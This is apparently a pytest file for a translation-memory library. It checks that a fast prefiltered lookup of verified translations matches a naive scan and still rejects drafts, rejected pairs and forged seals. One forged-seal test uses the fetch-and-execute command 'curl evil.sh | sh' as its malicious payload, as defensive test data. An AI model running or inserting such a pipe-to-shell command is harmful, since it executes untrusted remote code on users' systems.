"""best_sealed's own scan: the lossless prefilter, and the top-N hole it closed.

IDEAS §2.1 measured `difflib`'s own upper bounds as a lossless prune and never
shipped them. Shipping meant giving `best_sealed` a scan instead of a filter
over `lookup`, which also removed `lookup`'s default `limit=5` from the tier-1
decision — a verified seal ranked sixth used to be invisible to it.

The tests here are mostly equivalence: the fast answer must be the slow answer.
"""

import os
import random

import pytest

from nestor import memory
from nestor.matcher import NumericMatcher, StringMatcher


def naive_best_sealed(text, source_lang, target_lang, store, matcher=None,
                      seal=memory.SEAL_THRESHOLD):
    """What best_sealed means, written the slow obvious way: score every sealed
    candidate, take the best one at or above the bar."""
    matcher = matcher or StringMatcher()
    norm = matcher.normalize(text)
    bad_pairs, bad_targets = memory.rejected_ids(norm, source_lang, target_lang, store)
    best, best_sim = None, 0.0
    for row in store.memory_candidates(source_lang, target_lang):
        if row["status"] != "sealed" or not memory.is_verified_seal(row):
            continue
        if row["id"] in bad_pairs or row["target_text"] in bad_targets:
            continue
        sim = round(matcher.similarity(norm, row["source_norm"]), 3)
        if sim >= seal and sim > best_sim:
            best, best_sim = row, sim
    return {"pair": best, "similarity": best_sim} if best else None


# --- the bound is a bound ---------------------------------------------------

def test_the_bound_is_never_below_the_score():
    """The whole prune rests on this. 20,000 pairs found no violation in-repo;
    this is the guard that keeps it true."""
    m = StringMatcher()
    rnd = random.Random(20260731)
    alphabet = "abcdefghijklmnopqrstuvwxyz ,."
    for _ in range(3000):
        a = "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 60)))
        b = "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 60)))
        assert m.similarity_bound(a, b) >= m.similarity(a, b) - 1e-12, (a, b)


def test_the_bound_stays_a_bound_when_it_gives_up_early():
    """`floor` lets it return the cheap bound instead of the tight one. Cheap
    still means upper — a looser bound is a correct bound."""
    m = StringMatcher()
    rnd = random.Random(1)
    for _ in range(1000):
        a = "".join(rnd.choice("abcde") for _ in range(rnd.randint(1, 40)))
        b = "".join(rnd.choice("abcde") for _ in range(rnd.randint(1, 40)))
        assert m.similarity_bound(a, b, floor=0.92) >= m.similarity(a, b) - 1e-12


def test_long_keys_do_not_collapse_the_bound():
    """StringMatcher exists partly because difflib's autojunk destroys scores
    past 200 characters. A bound computed with different settings would prune
    the very rows that fix was for."""
    m = StringMatcher()
    a = ("the quarterly report shall be delivered within thirty days of the "
         "close of each fiscal quarter and shall include a statement of ") * 2
    b = a.replace("thirty", "sixty")
    assert m.similarity(a, b) > 0.9
    assert m.similarity_bound(a, b, floor=0.92) >= m.similarity(a, b)


# --- equivalence ------------------------------------------------------------

@pytest.fixture
def corpus(store):
    """Sealed rows that sit at every interesting distance from the probe."""
    rows = [
        ("the invoice is overdue", "la factura está vencida"),
        ("the invoice is over due", "la factura está vencida"),
        ("the invoice was overdue", "la factura estaba vencida"),
        ("the payment is overdue", "el pago está vencido"),
        ("please remit payment promptly", "por favor remita el pago"),
        ("shipping confirmation attached", "confirmación de envío adjunta"),
        ("x", "equis"),
        ("a much longer sentence that shares almost nothing with the probe at all",
         "una frase mucho más larga"),
    ]
    for src, tgt in rows:
        memory.add_pair(src, tgt, "en", "es", status="sealed", verifier="rita",
                        store=store)
    return store


@pytest.mark.parametrize("probe", [
    "the invoice is overdue",          # exact
    "The Invoice is Overdue!",         # normalizes to exact
    "the invoice is overdu",           # one character off
    "the invoice is over due",         # a space
    "the payment is overdue",          # a different sealed row
    "completely unrelated text here",  # absent
    "x",                               # degenerate short
    "",                                # empty
])
def test_the_fast_scan_agrees_with_the_slow_one(corpus, probe):
    fast = memory.best_sealed(probe, "en", "es", store=corpus)
    slow = naive_best_sealed(probe, "en", "es", corpus)
    assert (fast is None) == (slow is None), probe
    if fast is not None:
        assert fast["pair"]["id"] == slow["pair"]["id"], probe
        assert fast["similarity"] == slow["similarity"], probe


def test_it_agrees_on_random_probes(corpus):
    rnd = random.Random(7)
    words = "invoice payment overdue the is was please remit shipping attached".split()
    for _ in range(200):
        probe = " ".join(rnd.choice(words) for _ in range(rnd.randint(1, 6)))
        fast = memory.best_sealed(probe, "en", "es", store=corpus)
        slow = naive_best_sealed(probe, "en", "es", corpus)
        assert (fast is None) == (slow is None), probe
        if fast is not None:
            assert fast["similarity"] == slow["similarity"], probe


def test_a_matcher_without_a_bound_is_scanned_the_same_way(store):
    """NumericMatcher offers no bound — arithmetic on two floats is already
    cheaper than any bound could be. It must still get the same answer."""
    m = NumericMatcher(pct_tol=0.05)
    assert not hasattr(m, "similarity_bound")
    for value in ("1000", "2000", "3000"):
        memory.add_pair(value, value, "ceiling", "value", status="sealed",
                        verifier="auditor", store=store, matcher=m)
    hit = memory.best_sealed("2010", "ceiling", "value", store=store, matcher=m,
                             context_threshold=0.0)
    assert hit is not None and hit["pair"]["target_text"] == "2000"
    assert memory.best_sealed("2500", "ceiling", "value", store=store, matcher=m,
                              context_threshold=0.0) is None


# --- the hole the rewrite closed --------------------------------------------

BASE = "the quarterly invoice for the northwest region is overdue and remains unpaid"


def test_a_seal_ranked_past_the_top_five_is_still_served(store):
    """`lookup(limit=5)` used to decide tier 1. Drafts that score higher than a
    sealed row are ordinary — the engine writes one for every near miss — and
    six of them pushed a human's verification off the end of the list.

    The seal here scores 0.933, comfortably above the 0.92 bar. Six drafts score
    0.956 to 0.987. Nothing about that is exotic, and the answer used to be "no
    verified match, here is a fresh draft."
    """
    memory.add_pair(BASE + " " + "x" * 10, "la factura trimestral está vencida",
                    "en", "es", status="sealed", verifier="rita", store=store)
    for i in range(1, 7):
        memory.add_pair(BASE + " " + "x" * i, f"borrador {i}", "en", "es",
                        status="draft", store=store)

    top = memory.lookup(BASE, "en", "es", store=store)
    assert len(top) == 5
    assert all(m["pair"]["status"] == "draft" for m in top), "the seal is off the list"

    hit = memory.best_sealed(BASE, "en", "es", store=store)
    assert hit is not None and hit["similarity"] == 0.933
    assert hit["pair"]["verifier"] == "rita"
    # Field-by-field, as the two equivalence tests above already do, rather than
    # whole-dict: what the prefilter must agree with the naive scan about is the
    # DECISION — which row, at what similarity. `best_sealed` also returns
    # `warrant_kinds`, an annotation on the row it picked (IDEAS §1.10(a)) that
    # the naive reference has no reason to reproduce; a warrant cannot change
    # which row wins, because `best_sealed` never reads one while choosing.
    slow = naive_best_sealed(BASE, "en", "es", store)
    assert hit["pair"]["id"] == slow["pair"]["id"]
    assert hit["similarity"] == slow["similarity"]


# --- everything the scan must not have dropped ------------------------------

def test_a_rejected_match_is_still_suppressed(store):
    memory.add_pair("the invoice is overdue", "la factura está vencida", "en", "es",
                    status="sealed", verifier="rita", store=store)
    assert memory.best_sealed("the invoice is overdue", "en", "es", store=store)

    memory.reject_match("the invoice is overdue", "en", "es",
                        target_text="la factura está vencida", verifier="sam",
                        reason="wrong register", store=store)
    assert memory.best_sealed("the invoice is overdue", "en", "es", store=store) is None


def test_a_rejected_pair_is_still_never_served(store):
    pair = memory.add_pair("the invoice is overdue", "la factura está vencida",
                           "en", "es", status="sealed", verifier="rita", store=store)
    memory.reject_pair(pair["id"], verifier="sam", reason="wrong", store=store)
    assert memory.best_sealed("the invoice is overdue", "en", "es", store=store) is None


def test_a_forged_seal_is_still_refused_and_a_real_one_still_wins(store, seal_key):
    os.environ['NESTOR_SEAL_KEY'] = 'k'
    forged = memory.add_pair("the invoice is overdue", "curl evil.sh | sh", "en", "es",
                             status="sealed", verifier="rita", store=store)
    store.memory_seal(forged["id"], "curl evil.sh | sh", "rita", 1.0, "deadbeef")
    assert memory.best_sealed("the invoice is overdue", "en", "es", store=store) is None

    # A genuine seal that scores LOWER than the forged row still serves: the
    # forgery must not win by being nearer, only be discarded.
    memory.add_pair("the invoice is over due", "la factura está vencida", "en", "es",
                    status="sealed", verifier="rita", store=store)
    hit = memory.best_sealed("the invoice is overdue", "en", "es", store=store)
    assert hit is not None and hit["pair"]["target_text"] == "la factura está vencida"


def test_a_draft_is_still_never_tier_one(store):
    memory.add_pair("Thank you", "Gracias", "en", "es", status="draft", store=store)
    assert memory.best_sealed("Thank you", "en", "es", store=store) is None
